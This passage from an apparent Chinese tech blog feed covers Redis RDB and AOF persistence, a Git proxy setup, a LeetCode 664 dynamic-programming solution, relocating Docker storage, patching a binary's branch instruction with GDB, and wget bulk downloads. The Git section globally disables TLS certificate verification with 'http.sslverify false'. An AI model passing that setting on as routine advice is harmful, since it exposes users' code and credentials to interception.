<p>可以通过<code>ob -cx dump.rdb</code>命令解析这个RDB文件, 但输出结果不够直观；更好的方式是借助开源社区已有的RDB分析工具, 可以参考：<a href="https://github.com/sripathikrishnan/redis-rdb-tools">https://github.com/sripathikrishnan/redis-rdb-tools</a></p>
<p>这里将RDB文件转换为json格式查看，命令如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># rdb -c json /var/redis/6379/dump.rdb</span><br><span class="line">[&#123;</span><br><span class="line">&quot;set1&quot;:[&quot;1&quot;,&quot;2&quot;,&quot;3&quot;],</span><br><span class="line">&quot;zset1&quot;:&#123;&quot;m1&quot;:&quot;1&quot;,&quot;m2&quot;:&quot;2&quot;,&quot;m3&quot;:&quot;3&quot;&#125;,</span><br><span class="line">&quot;hashtable1&quot;:&#123;&quot;k1&quot;:&quot;v1&quot;,&quot;k2&quot;:&quot;v2&quot;,&quot;k3&quot;:&quot;v3&quot;&#125;,</span><br><span class="line">&quot;list1&quot;:[&quot;1&quot;,&quot;2&quot;,&quot;3&quot;],</span><br><span class="line">&quot;str1&quot;:&quot;123&quot;&#125;]</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】《Redis设计与实现》  第10章 RDB持久化</p>
<p>【2】<a href="https://cloud.tencent.com/developer/article/1394329">Redis RDB文件离线分析</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(九)——AOF持久化</title>
    <url>/2021/03/20/2021-03-20-redis-note-09-aof/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Redis提供了AOF(append only file)持久化功能，通过保存服务器执行的写命令的方式记录数据库状态。本文介绍如下内容：</p>
<ul>
<li>AOF持久化的实现 (命令追加、文件写入、AOF重写、AOF后台重写)</li>
<li>如何通过AOF文件还原数据库</li>
<li>AOF持久化的配置选项</li>
<li>AOF和RDB两种持久化方式的比较</li>
</ul>
<span id="more"></span>

<h3 id="AOF持久化的实现"><a href="#AOF持久化的实现" class="headerlink" title="AOF持久化的实现"></a>AOF持久化的实现</h3><p>以下介绍AOF持久化的实现方式，内容分别如下：</p>
<ul>
<li><p>命令追加</p>
</li>
<li><p>文件写入和同步 </p>
</li>
<li><p>AOF重写</p>
</li>
<li><p>AOF后台重写</p>
</li>
</ul>
<h4 id="命令追加"><a href="#命令追加" class="headerlink" title="命令追加"></a>命令追加</h4><p>AOF功能开启后，每当服务器执行完一条写命令，这条写命令就会以协议格式追加到服务器状态的aof_buf缓冲区中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> &#123;</span></span><br><span class="line">	sds aof_buf;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>例如，客户端向服务端发送<code>set number 1</code>命令，服务器执行完SET后，会将如下协议内容追加到aof_buf缓冲区</p>
<p>*3\r\n$3\r\nset\r\n$6\r\n\number\r\n$1\r\n\1\r\n</p>
<p>其中，\r\n表示换行符，我们打开对应的AOF文件，可以看到文件末尾追加了如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$6</span><br><span class="line">number</span><br><span class="line">$1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<h4 id="文件写入和同步"><a href="#文件写入和同步" class="headerlink" title="文件写入和同步"></a>文件写入和同步</h4><p><strong>问题：</strong> aof_buf缓冲区在内存中，它是在什么时间点，以何种策略被写入到AOF文件的？</p>
<p>Redis服务器是一个事件驱动的程序，主进程就是一个事件循环(参考aeMain函数)，负责处理两类事件：文件事件、时间事件。</p>
<p>服务器处理文件事件时可能会执行写命令，这使得相应的协议内容被追加到aof_buf缓冲区，<strong>因此服务器在结束一个事件循环前，会调用flushAppendOnlyFile函数，考虑是否将aof_buf缓冲区的内容写入到AOF文件。</strong></p>
<p>以Redis 6.0版本的源码为例，事件主循环aeMain的实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">aeMain</span><span class="params">(aeEventLoop *eventLoop)</span> &#123;</span><br><span class="line">    eventLoop-&gt;stop = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!eventLoop-&gt;stop) &#123; <span class="comment">// 事件主循环，处理文件事件、时间事件...</span></span><br><span class="line">    	<span class="comment">// AE_ALL_EVENTS: 文件事件、时间事件</span></span><br><span class="line">    	<span class="comment">// AE_CALL_BEFORE_SLEEP: 一次事件循环中，调用aeApiPoll之前执行的处理函数 (flushAppendOnlyFile)</span></span><br><span class="line">        aeProcessEvents(eventLoop, AE_ALL_EVENTS | AE_CALL_BEFORE_SLEEP | AE_CALL_AFTER_SLEEP);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>单次事件循环aeProcessEvents函数的实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 单次事件循环 aeProcessEvents</span><br><span class="line">int aeProcessEvents(aeEventLoop *eventLoop, int flags) &#123;</span><br><span class="line">	// ...</span><br><span class="line">	eventLoop-&gt;beforesleep(eventLoop);	    // beforesleep为函数指针，其指向的函数中会调用flushAppendOnlyFile方法！</span><br><span class="line">	numevents = aeApiPoll(eventLoop, tvp);	// 通过I/O多路复用接口(select/poll/epoll),获取所有就绪的文件事件。</span><br><span class="line">    // ... 处理文件事件 + 时间事件</span><br><span class="line">	return processed;	// 返回处理的事件总数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>flushAppendOnlyFile</code>函数的行为根据服务器的配置选项<code>appendfsync</code>决定，该选项有三种取值，每种值对应的行为如下：</p>
<table>
<thead>
<tr>
<th align="left">appendfsync选项的取值</th>
<th align="left">flushAppendOnlyFile函数的行为</th>
<th align="left">安全性</th>
</tr>
</thead>
<tbody><tr>
<td align="left">always</td>
<td align="left">总是将aof_buf缓冲区内容写入并同步到AOF文件</td>
<td align="left">最高，只丢失一个事件循环中的数据</td>
</tr>
<tr>
<td align="left">everysec</td>
<td align="left">如距离上次同步AOF文件时间超过1秒，才对AOF文件进行同步操作，注意该同步操作通过一个线程专门负责执行</td>
<td align="left">会丢失约1秒种的数据</td>
</tr>
<tr>
<td align="left">no</td>
<td align="left">对AOF文件同步操作由操作系统自己决定</td>
<td align="left">最低，会丢失距离上次同步AOF文件之后的所有数据</td>
</tr>
</tbody></table>
<p>可以看出，<code>everysec</code>选项兼顾了性能和安全性，这也是官方推荐的默认选项。</p>
<p>注：<code>fsync</code>，<code>fdatasync</code>可以强制操作系统立即将内存缓冲区中数据写入磁盘。</p>
<h4 id="AOF重写"><a href="#AOF重写" class="headerlink" title="AOF重写"></a>AOF重写</h4><p>随着服务器持续运行，执行的写命令会越来越多，导致AOF文件越来越大，影响性能。<strong>因此我们需要对AOF文件大小加以控制，在不改变数据库状态的前提下，压缩AOF文件体积</strong> —— 这就是Redis提供的AOF重写功能。</p>
<p>举例:</p>
<p>对一个列表键做如下写操作，为了保存这个列表键，AOF文件需记录3条命令，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis&gt; rpush list1 a b		# [a, b]</span><br><span class="line">redis&gt; rpop list1			# [b]</span><br><span class="line">redis&gt; rpush list1 c		# [b, c]</span><br></pre></td></tr></table></figure>

<p>如果想用更少的命令记录这个列表键，最简单的方法是直接读取这个列表键的值，用<code>rpush list1 b c</code>替代上面的3条命令。</p>
<p>通过这个例子可以看出AOF重写的实现要点：<strong>AOF重写通过读取服务器数据库状态来实现，而不是去分析现有的AOF文件！</strong> 源码实现参考<code>rewriteAppendOnlyFileBackground</code>函数。</p>
<h4 id="AOF后台重写"><a href="#AOF后台重写" class="headerlink" title="AOF后台重写"></a>AOF后台重写</h4><p>AOF重写功能涉及大量写操作，Redis不希望AOF重写造成服务器无法处理请求，所以<strong>将AOF重写放到子进程里执行</strong>(这点和RDB持久化的BGSAVE思路类似)，这使得父进程不被阻塞，可以继续处理请求。这种处理方式会引入了一个问题：<strong>子进程执行AOF重写时，服务器会继续处理请求，可能会执行新的写命令，导致数据库状态发生变化，与AOF文件中的数据库状态不一致！</strong></p>
<p>为了解决这种数据不一致的问题，<strong>Redis设置了一个AOF重写缓冲区，在子进程进行AOF重写期间，服务器将客户端的写命令请求同时追加到AOF缓冲区和AOF重写缓冲区</strong>。</p>
<p>子进程完成AOF重写工作后，通知父进程将AOF重写缓冲区中的内容追加到新的AOF文件中，再原子性地覆盖旧的AOF文件，完成整个AOF后台重写。</p>
<p>源码实现参考<code>rewriteAppendOnlyFileBackground</code>函数和<code>backgroundRewriteDoneHandler</code>函数</p>
<h4 id="如何通过AOF文件还原数据库"><a href="#如何通过AOF文件还原数据库" class="headerlink" title="如何通过AOF文件还原数据库"></a>如何通过AOF文件还原数据库</h4><p>创建一个无网络连接的伪客户端(fd值为-1)，从AOF文件中读出每条指令并执行，一直到AOF文件中所有的写命令执行完毕为止。源码实现参考<code>loadAppendOnlyFile</code>函数</p>
<h3 id="AOF配置选项"><a href="#AOF配置选项" class="headerlink" title="AOF配置选项"></a>AOF配置选项</h3><p>常用配置选项如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">appendonly yes                      # 值为yes，表示开启AOF持久化功能。</span><br><span class="line">appendfilename &quot;appendonly.aof&quot;     # 指定aof文件名称</span><br><span class="line">appendfsync everysec                # 指定AOF文件的写入方式， everysec表示每秒同步一次</span><br></pre></td></tr></table></figure>

<h3 id="AOF和RDB比较"><a href="#AOF和RDB比较" class="headerlink" title="AOF和RDB比较"></a>AOF和RDB比较</h3><p>RDB：文件相对较小，恢复较快，适合数据备份、灾难恢复。</p>
<p>AOF：文件相对较大，备份频率高(要设置fsync 策略), 适合故障恢复。</p>
<p>需针对不同业务场景选择合适的持久化方式：</p>
<ul>
<li><p>只用来做缓存 —— 可以关闭持久化功能。</p>
</li>
<li><p>对丢失数据不敏感 —— 仅使用RDB；对丢失数据敏感 —— 综合使用RDB + AOF</p>
</li>
</ul>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>【1】《Redis设计与实现》第11章 AOF持久化<br>【2】<a href="https://gitchat.csdn.net/activity/5d5117876f8c3424da08b7af?utm_source=so">Redis 持久化 RDB&#x2F;AOF 详解与实践</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>配置Git代理，解决下载龟速问题</title>
    <url>/2021/06/05/2021-06-05-git-download-too-slow/</url>
    <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>git clone龟速或出错，需要配置代理。</p>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>首先，你的本地机器必须有socks5代理</p>
<p>进<code>git bash</code>，敲如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git config --global https.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git config --global http.sslverify false</span><br><span class="line">git config -l</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h4 id="典型问题"><a href="#典型问题" class="headerlink" title="典型问题"></a>典型问题</h4><p>git clone报错: fatal: unable to access XXX.git: OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443</p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>StackOverFlow上能搜到同样问题，参考：<a href="https://stackoverflow.com/questions/49345357/fatal-unable-to-access-https-github-com-xxx-openssl-ssl-connect-ssl-error">https://stackoverflow.com/questions/49345357/fatal-unable-to-access-https-github-com-xxx-openssl-ssl-connect-ssl-error</a></p>
<p>进<code>git bash</code>，敲如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global --add remote.origin.proxy &quot;127.0.0.1:1087&quot;</span><br></pre></td></tr></table></figure>

<p>其中1087为http端口，打开你的ss软件，在设置中查看端口号即可：<br><img src="/2021/06/05/2021-06-05-git-download-too-slow/image1.png"></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode 664 奇怪的打印机</title>
    <url>/2021/08/15/2021-08-15-leetcode-664-weird-printer/</url>
    <content><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><a href="https://leetcode-cn.com/problems/strange-printer">https://leetcode-cn.com/problems/strange-printer</a></p>
<span id="more"></span>

<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>贪心法找不到明显思路，尝试动态规划求解。</p>
<p><strong>1、 先明确动归问题的定义：</strong></p>
<p>记f[i][j]为完成第i个字符到第j个字符的最少打印次数。记字符串s长度为n，则f[0][n-1]即为所求。</p>
<p><strong>2、 将问题拆分成子问题，推导递推方程：</strong></p>
<p>可以将区间[i, j]分解成[i, k]，[k + 1, j] （其中i &lt;&#x3D; k &lt; j)，完成[i, j]打印问题转化为分别完成[i, k], [k + 1, j]两部分打印， k取值一共有j - i种可能，取最小的即可。递推方程：f[i][j] &#x3D; min (k &#x3D; i, k &lt; j) f[i][k] + f[k+1][j]</p>
<p><strong>3 、再考虑边界条件，缩小问题规模：</strong></p>
<ul>
<li><p>对于长度为1的区间，只需打印一次。对所有i都有，f[i][i] &#x3D; 1</p>
</li>
<li><p>对于区间[i, j]，如果第i个字符和第j个字符相等，可以在打印第i个字符时，顺便打印到右侧第j个字符，此时有f[i][j] &#x3D; f[i][j - 1]</p>
</li>
</ul>
<p>最终推导出状态转移方程：<br><img src="/2021/08/15/2021-08-15-leetcode-664-weird-printer/image1.png"></p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>可以用记忆化搜索，或者自底向上法，代码如下：</p>
<h4 id="记忆化搜索"><a href="#记忆化搜索" class="headerlink" title="记忆化搜索"></a>记忆化搜索</h4><p>套路就是用一个数组，在首次求解子问题时，保存（记忆）这个子问题的解，当再次求解相同子问题时，直接从数组里读取，避免重复递归。代码参考：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> N_MAX 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> g_strlen;</span><br><span class="line"><span class="type">int</span> dp[N_MAX][N_MAX];						<span class="comment">// 套路: 用一个数组，记录所有子问题的解</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Dfs</span><span class="params">(<span class="type">char</span> *s, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == j) &#123;</span><br><span class="line">        <span class="keyword">return</span> dp[i][i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s[i] == s[j]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dp[i][j - <span class="number">1</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">            dp[i][j - <span class="number">1</span>] = Dfs(s, i, j - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[i][j - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> minT = <span class="number">0x3f3f3f3f</span>;						<span class="comment">// s[i] != s[j], 取所有j-i中可能中最小的解</span></span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; j; ++k) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dp[i][k] == <span class="number">0</span>) &#123;</span><br><span class="line">            dp[i][k] = Dfs(s, i, k);			<span class="comment">// 如子问题(i, k)已经求解过，直接从数组读取</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dp[k + <span class="number">1</span>][j] == <span class="number">0</span>) &#123;</span><br><span class="line">            dp[k + <span class="number">1</span>][j] = Dfs(s, k + <span class="number">1</span>, j);	<span class="comment">// 如子问题(k + 1, j)已经求解过，直接从数组读取</span></span><br><span class="line">        &#125;</span><br><span class="line">        tmp = dp[i][k] + dp[k + <span class="number">1</span>][j];</span><br><span class="line">        <span class="keyword">if</span> (tmp &lt; minT) &#123;</span><br><span class="line">            minT = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strangePrinter</span><span class="params">(<span class="type">char</span> * s)</span>&#123;</span><br><span class="line">    g_strlen = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_MAX; ++i) &#123;</span><br><span class="line">        dp[i][i] = <span class="number">1</span>;					<span class="comment">// 边界条件，长度为1的区间，只需打印一次</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Dfs(s, <span class="number">0</span>, g_strlen - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="自底向上法"><a href="#自底向上法" class="headerlink" title="自底向上法"></a>自底向上法</h4><p>相比记忆化搜索，自底向上法还需要<strong>考虑每个子问题的求解顺序</strong>。根据递推式，这里需从大到小去遍历i, 从小到大遍历j，就可以保证计算f[i][j]时，f[i][k] + f[k + 1][j]都被计算过。</p>
<p><strong>优化点</strong>：s[i] !&#x3D; s[j]时剪枝，只有s[i]和s[k]相等时才计算，进一步压缩空间。代码参考：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> N_MAX 100</span></span><br><span class="line"><span class="type">int</span> dp[N_MAX][N_MAX];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strangePrinter</span><span class="params">(<span class="type">char</span> * s)</span>&#123;</span><br><span class="line">    <span class="type">int</span> str_len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">0x3f</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = str_len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        dp[i][i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; str_len; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == s[j]) &#123;</span><br><span class="line">                dp[i][j] = dp[i][j - <span class="number">1</span>];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; j; ++k) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i] != s[k]) &#123;			<span class="comment">// 剪枝，只有s[i]和s[k]相等时才计算，进一步压缩空间。</span></span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                tmp = dp[i][k] + dp[k + <span class="number">1</span>][j];</span><br><span class="line">                <span class="keyword">if</span> (tmp &lt; dp[i][j]) &#123;</span><br><span class="line">                    dp[i][j] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[<span class="number">0</span>][str_len - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>LeetCode官方题解：<a href="https://leetcode-cn.com/problems/strange-printer/solution/qi-guai-de-da-yin-ji-by-leetcode-solutio-ogbu/">https://leetcode-cn.com/problems/strange-printer/solution/qi-guai-de-da-yin-ji-by-leetcode-solutio-ogbu/</a></p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>修改Docker容器的存储路径</title>
    <url>/2021/10/16/2021-10-16-modify-docker-image-path/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>docker拉取的镜像默认存储在根路径(<code>/var/lib/docker</code>)，但根路径存储空间有限。我们可以通过挂载更大的磁盘，将docker数据迁移到挂载磁盘上, 以解决空间不足问题。具体方法如下：</p>
<span id="more"></span>

<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>假设挂载磁盘在<code>/usr1</code>，需要将docker数据迁移到路径<code>/usr1</code>下。步骤如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service docker stop 				# 停止容器</span><br><span class="line">mv /var/lib/docker /usr1/docker 	# 迁移docker数据到新路径，新路径只需保证在/usr1下即可</span><br><span class="line">ln -s /usr1/docker /var/lib/docker  # 创建软连接</span><br><span class="line">service docker start				# 重新启动docker</span><br></pre></td></tr></table></figure>

<p>通过 <code>df -h</code>命令可确认修改生效。</p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>使用GDB修改二进制文件</title>
    <url>/2021/10/16/2021-10-16-use-gdb-to-modify-binary-file/</url>
    <content><![CDATA[<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>GDB不仅可以用来调试程序，还可以直接修改被调试程序的二进制文件。这种方式相比于改源码重新编译、<code>gdb attach</code>有什么优势呢？考虑以下企业生产环境中的几个调试场景：</p>
<ul>
<li><strong>需要修改的二进制文件是其他领域的，你没有源码和编译工程</strong>，让相关领域出调试对接件比较费时，但你只想临时改一行别人的代码，几分钟内完成验证。</li>
<li><strong>调试环境上，使用gdb attach进程方式有困难</strong>：<ul>
<li>被调试的服务（进程）没有启动断点(可定位性很差)，或者gdb手动拉起的方法非常复杂，等服务正常启动后再attach已经赶不上打断点的时机。</li>
<li>长时间gdb挂住业务进程导致触发丢心跳复位。</li>
<li>你不确定修改的二进制文件同时被几个进程加载，但你诉求很明确，就是直接改文件，对所有进程生效。</li>
</ul>
</li>
</ul>
<p>以下举一个简单的例子，介绍GDB修改程序二进制文件的技巧：</p>
<span id="more"></span>

<h3 id="问题举例"><a href="#问题举例" class="headerlink" title="问题举例"></a>问题举例</h3><p>有一个需修改的二进制文件，C码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> grade = <span class="number">65</span>;</span><br><span class="line">    <span class="keyword">if</span> (grade &lt;= <span class="number">60</span>) &#123;			<span class="comment">// 这里写错了，需要修改成 &gt;= 60及格</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;pass\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fail\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序执行结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gcc main.c -o main &amp;&amp; ./main</span><br><span class="line">fail</span><br></pre></td></tr></table></figure>

<p><font color = 'red'>【问题】</font>这里需要将<code>grade &lt;= 60</code> 要改成 <code>grade &gt; 60</code>。只通过GDB修改二进制文件的方式怎么实现？</p>
<h3 id="技巧-解决步骤"><a href="#技巧-解决步骤" class="headerlink" title="技巧&amp;解决步骤"></a>技巧&amp;解决步骤</h3><p>1、缺省情况下，<code>gdb</code>是以只读方式加载程序的。需要先通过命令行指定加载方式为可写，再通过file命令加载二进制文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) set write on</span><br><span class="line">(gdb) show write</span><br><span class="line">Writing into executable and core files is on.</span><br><span class="line">(gdb) file main</span><br><span class="line">Reading symbols from main...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure>

<p>2、结合C码和汇编代码，定位出需修改的汇编指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble /mr main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001135 &lt;+0&gt;:     55                      push   %rbp</span><br><span class="line">   0x0000000000001136 &lt;+1&gt;:     48 89 e5                mov    %rsp,%rbp</span><br><span class="line">   0x0000000000001139 &lt;+4&gt;:     48 83 ec 10             sub    $0x10,%rsp</span><br><span class="line">   0x000000000000113d &lt;+8&gt;:     c7 45 fc 41 00 00 00    movl   $0x41,-0x4(%rbp)</span><br><span class="line">   0x0000000000001144 &lt;+15&gt;:    83 7d fc 3c             cmpl   $0x3c,-0x4(%rbp)        # 0x3c = 60, 对应C码：grade &lt;= 60</span><br><span class="line">   0x0000000000001148 &lt;+19&gt;:    7f 0e                   jg     0x1158 &lt;main+35&gt;</span><br><span class="line">   0x000000000000114a &lt;+21&gt;:    48 8d 3d b3 0e 00 00    lea    0xeb3(%rip),%rdi        # 0x2004</span><br><span class="line">   0x0000000000001151 &lt;+28&gt;:    e8 da fe ff ff          callq  0x1030 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000001156 &lt;+33&gt;:    eb 0c                   jmp 0x1164 &lt;main+47&gt;</span><br><span class="line">   0x0000000000001158 &lt;+35&gt;:    48 8d 3d aa 0e 00 00    lea    0xeaa(%rip),%rdi        # 0x2009</span><br><span class="line">   0x000000000000115f &lt;+42&gt;:    e8 cc fe ff ff          callq  0x1030 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000001164 &lt;+47&gt;:    b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">   0x0000000000001169 &lt;+52&gt;:    c9                      leaveq</span><br><span class="line">   0x000000000000116a &lt;+53&gt;:    c3                      retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不难发现， <code>if (grade &lt;= 60)</code> 对应的指令为：<code>0x1148 &lt;+19&gt;: 7f 0e jg 0x1158 &lt;main+35&gt;</code>， 这里只需要将<code>jg</code>指令改<code>jle</code>指令即可。</p>
<p>3、<code>jg</code>, <code>jle</code>指令格式参考<a href="https://www.intel.cn/content/www/cn/zh/architecture-and-technology/64-ia-32-architectures-software-developer-vol-2a-manual.html">指令集手册</a>，如下：<br><img src="/2021/10/16/2021-10-16-use-gdb-to-modify-binary-file/image1.png"><br>所以只需要将 <code>7f 0e</code> 改成<code>7e 0e</code>即可。</p>
<p>4、修改二进制代码（注意大小端和指令长度），用<code>gdb</code>的<code>set</code>命令修改地址处的内容，方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble /mr main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   ...</span><br><span class="line">   0x0000000000001148 &lt;+19&gt;:    7f 0e   jg     0x1158 &lt;main+35&gt;</span><br><span class="line">   ...</span><br><span class="line">(gdb) set *(short *)0x1148 = 0xe7e  (指令长度为2个字节，这里是小端序)</span><br><span class="line">(gdb) disassemble /mr main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   ...</span><br><span class="line">   0x0000000000001148 &lt;+19&gt;:    7e 0e   jle    0x1158 &lt;main+35&gt;</span><br><span class="line">   ...</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>退出<code>gdb</code>, 执行<code>main</code>程序输出pass，说明修改生效：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./main</span><br><span class="line">pass</span><br></pre></td></tr></table></figure>

<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>如果改成70分以上及格，如何修改？如果是aarch64格式的二进制呢？</p>
<p>注意：涉及到立即数的修改，x86_64和aarch64差异很大。aarch64中不同的汇编指令，对立即数的存储方式和表示范围都不同，具体操作时需查询对应的指令集手册。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>【1】<a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/">《100个gdb小技巧》</a></p>
<p>【2】<a href="https://developer.arm.com/documentation/ddi0487/latest/arm-architecture-reference-manual-armv8-for-armv8-a-architecture-profile">《ARM Architecture Reference Manual, for ARMv8-A architecture profile》</a></p>
<p>【3】<a href="https://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-vol-2a-manual.html">《64-ia-32-architectures-software-developer-vol-2a-manual》</a></p>
]]></content>
      <categories>
        <category>GDB</category>
      </categories>
      <tags>
        <tag>GDB</tag>
      </tags>
  </entry>
  <entry>
    <title>使用wget批量下载指定类型文件</title>
    <url>/2021/10/16/2021-10-16-use-wget-to-download-file/</url>
    <content><![CDATA[<p>举例：下载所有的RPM包(文件的扩展名为rpm)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -c -r -np -k -L -p -A rpm http:XXX/</span><br></pre></td></tr></table></figure>

